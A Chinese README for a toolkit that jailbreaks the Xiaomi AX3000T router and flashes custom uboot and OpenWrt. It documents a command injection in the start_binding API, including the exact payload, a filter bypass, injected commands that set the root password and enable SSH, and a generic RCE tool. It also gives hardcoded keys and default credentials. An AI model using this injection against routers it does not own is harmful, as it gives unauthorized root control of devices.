# 小米 AX3000T 刷机工具集

小米 AX3000T (RD03) 路由器刷机自动化工具。从出厂初始化到刷入自定义 uboot 的完整流程。

## 目标设备

| 项目 | 值 |
|------|------|
| 型号 | 小米路由器 AX3000T (RD03) |
| SoC | IPQ5000 (MediaTek Filogic 820) |
| 闪存 | 128MB SPI-NAND |
| 默认 IP | `192.168.31.1` |
| uboot IP | `192.168.1.1` |
| 出厂默认密码 | `admin` |
| 固件版本 | `1.0.64` (实测) |

## NAND 分区布局

```
mtd0: spi0.0       (128MB)  整个 SPI-NAND
mtd1: BL2          (1MB)    预引导 (PBL/SBL)
mtd2: Nvram        (256KB)  NVRAM 配置
mtd3: Bdata        (256KB)  设备信息 (SN/MAC)
mtd4: Factory      (2MB)    WiFi 校准
mtd5: FIP          (2MB)    uboot (FIP FIT image)
mtd6: crash        (256KB)  崩溃日志
mtd7: crash_log    (256KB)  崩溃日志
mtd8: ubi          (34MB)   主固件
mtd9: ubi1         (34MB)   备份固件
mtd10: overlay     (32MB)   数据覆写
mtd11: data        (12MB)   用户数据
mtd12: KF          (256KB)  保留
```

## 文件结构

```
.
├── check_init.sh            # 检测路由器初始化状态 (API 直查)
├── check_version.sh         # 查看固件版本号
├── auto_init.py             # 自动完成初始化向导 (newEncryptMode=1)
├── login_get_stok.py        # 登录获取 stok (SHA256 POST)
├── enable_ssh.py            # start_binding 注入开 SSH
├── rce.py                   # 通用命令注入工具
├── flash_uboot.sh           # SCP 上传 + 刷写 mtd5 + 重启
├── QWEN.md                  # 本文件
├── backup/
│   ├── mtd1_BL2.bin         (1.1M) BL2 分区备份
│   ├── mtd3_Bdata.bin       (257K) Bdata 分区备份
│   ├── mtd4_Factory.bin     (2.1M) Factory 分区备份
│   └── mtd5_FIP.bin         (2.1M) FIP(uboot) 分区备份
└── files/
    ├── RD03_1.0.47.bin       # 降级固件
    ├── extract_hdr1/
    │   └── header.bin
    ├── openwrt/
    │   ├── immortalwrt-*-initramfs-factory.ubi       # 官方分区 initramfs
    │   ├── immortalwrt-*-ubootmod-bl31-uboot.fip     # 自定义 uboot (FIP)
    │   ├── immortalwrt-*-ubootmod-initramfs-factory.ubi  # 大分区 initramfs
    │   └── immortalwrt-*-ubootmod-initramfs-recovery.itb # 恢复内核
    ├── ubi_extract/
    └── xiaobai/
```

## 刷机全流程

### 阶段 1：获取 SSH 访问

```
检测状态 → 初始化(如需) → 注入开SSH
```

```bash
# Step 1: 检测状态
./check_init.sh
# {"init":1} → 需初始化
# {"init":0} → 已初始化

# Step 2: 出厂初始化（如需要）
python3 auto_init.py --admin-pwd 12345678

# Step 3: 注入开 SSH（无需重启，秒级就绪）
python3 enable_ssh.py --pwd 12345678 --wait
# SSH: root@192.168.31.1 / 密码: root
```

### 阶段 2：刷入自定义 uboot

```bash
# 上传 + 刷写 + 重启 一条命令
./flash_uboot.sh [可选的uboot文件路径]
# 默认使用 files/openwrt/ 下的 ubootmod-bl31-uboot.fip
```

刷完后路由器重启，电脑设静态 IP `192.168.1.10`，访问 `http://192.168.1.1` 进入 uboot web 刷机界面。

### 阶段 3：uboot web UI 刷入大分区固件

通过 uboot 网页界面上传刷写：
1. `ubootmod-initramfs-factory.ubi` — 大分区 initramfs（临时系统）
2. 启动后刷入完整 OpenWrt sysupgrade 固件

## 脚本说明

### check_init.sh — 检测初始化状态

```bash
./check_init.sh [IP]
# {"init":1} → 出厂未初始化
# {"init":0} → 已设置过
# {"init":-1,"error":...} → 不可达
```

原理：直接请求 `/cgi-bin/luci/api/xqsystem/init_info` 读取 `inited` 字段。

### check_version.sh — 查看固件版本

```bash
./check_version.sh [IP]
# 输出: 1.0.64
```

### auto_init.py — 初始化向导自动化

```bash
python3 auto_init.py [--ip IP] [--ssid SSID] [--wifi-pwd PWD] [--admin-pwd PWD]
# {"stok":"...", "ip":"192.168.31.1", "ssid":"Xiaomi_6ADF"}
```

适配 AX3000T `newEncryptMode=1`，与 AX5 的关键差异：

| 项 | AX5 (旧) | AX3000T (新) |
|---|---|---|
| 登录 | SHA1(nonce + SHA1(pwd+KEY)) | 明文 `password=admin&init=1` |
| WAN 设置 | GET `set_wan_new` | POST `set_wan_new` + `autoset=1` |
| nonce 格式 | `0__ts_rand` | 相同（旧格式） |
| oldPwd 算法 | SHA1 | SHA256 |
| newPwd | SHA1-AES | SHA1-AES + SHA256-AES (`newPwd256`) |
| 额外字段 | 无 | `update=1`, `bw160=1`, `bsd=1` |

### login_get_stok.py — 登录获取 stok

```bash
python3 login_get_stok.py [--ip IP] [--pwd PWD]
# {"stok":"..."}
```

使用 POST + SHA256，区别于 AX5 的 GET + SHA1。

### enable_ssh.py — 命令注入开 SSH

```bash
python3 enable_ssh.py [--stok STOK] --pwd PWD [--wait]
# {"stok":"...", "inject_ok":true, "ssh_ok":true, "ssh_user":"root", "ssh_pwd":"root"}
```

利用 `start_binding` API 的 `key` 参数命令注入。所有 `;` 自动替换为 `\n` 绕过 hackCheck。注入内容：

```
sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear
nvram set ssh_en=1
nvram set boot_wait=on
nvram commit
echo -e 'root\nroot' > /tmp/psw.txt
passwd root < /tmp/psw.txt
/etc/init.d/dropbear enable
/etc/init.d/dropbear restart
```

无需重启，SSH 秒级就绪。

### rce.py — 通用命令注入工具

```bash
# 执行单条命令
python3 rce.py --pwd 12345678 'cat /proc/version'

# 下载文件
python3 rce.py --pwd 12345678 \
  'curl -o /tmp/firmware.bin http://192.168.31.226:8080/firmware.bin'

# 仅获取 stok
python3 rce.py --stok-only --pwd 12345678
```

注意：注入无 stdout 回显，命令执行结果需通过副作用验证。

### flash_uboot.sh — 一键刷 uboot

```bash
./flash_uboot.sh [uboot文件路径]
```

执行：SCP 上传 → MD5 校验 → `mtd write` 到 `/dev/mtd5` → `reboot`。依赖 `sshpass`。

## 密码学

### 常量

| 常量 | 值 |
|------|-----|
| KEY | `a2ffa5c9be07488bbb04a3a47d3c5f6a` |
| IV | `64175472480004614961023454661220` |
| 出厂密码 | `admin` |
| 加密模式 | `newEncryptMode=1` (SHA256) |

### 登录密码 (已初始化后)

```python
account_str = SHA256(admin_pwd + KEY)           # SHA256 hex
password    = SHA256(nonce + account_str)        # SHA256 hex
```
POST 方式提交表单。

### oldPwd (set_router_normal, init 时)

```python
inner  = SHA256(factory_pwd + KEY)              # SHA256 hex
oldPwd = SHA256(nonce + inner)                  # SHA256 hex
```

### newPwd / newPwd256 (set_router_normal, init 时)

```python
# newPwd (SHA1-AES, 兼容模式)
aes_key  = SHA1(old_pwd + KEY)[:32]
plain    = SHA1(new_pwd + KEY).hex.encode()
newPwd   = AES_CBC_encrypt(plain, aes_key, IV, PKCS7)  # Base64

# newPwd256 (SHA256-AES, 新模式)
aes_key  = SHA256(old_pwd + KEY)[:32]
plain    = SHA256(new_pwd + KEY).hex.encode()
newPwd256 = AES_CBC_encrypt(plain, aes_key, IV, PKCS7) # Base64
```

nonce 格式：`0__{秒级时间戳}_{随机0-9999}`

### start_binding 注入

```python
payload = "1234' -X \n" + cmd + "\n logger -t X 'X"
# GET /cgi-bin/luci/;stok={stok}/api/xqsystem/start_binding?uid=1234&key={payload}
```

hackCheck version 2 过滤 `;` 和 `|`，返回 `nil`。绕过方式：将 `;` 替换为 `\n`。

## SSH 连接

```bash
sshpass -p 'root' ssh -oHostKeyAlgorithms=+ssh-rsa root@192.168.31.1
```

路由器只提供 `ssh-rsa` host key，需显式指定算法。

## 已知约定

- **JSON 输出** — 所有 Python 脚本 stdout 输出纯 JSON，stderr 输出进度
- **出错退出码** — 失败 exit 1，成功 exit 0
- **argparse** — 所有 Python 脚本支持 `--help`
- **依赖** — `auto_init.py` 需 `pycryptodome`；`enable_ssh.py` / `login_get_stok.py` / `rce.py` 纯标准库；`flash_uboot.sh` 需 `sshpass`；`check_init.sh` / `check_version.sh` 需 `curl` + `python3`

## Git

- **仓库**: 归属于 `Auto_Flash_Router` 项目
- **提交规范**: 简短描述改动内容
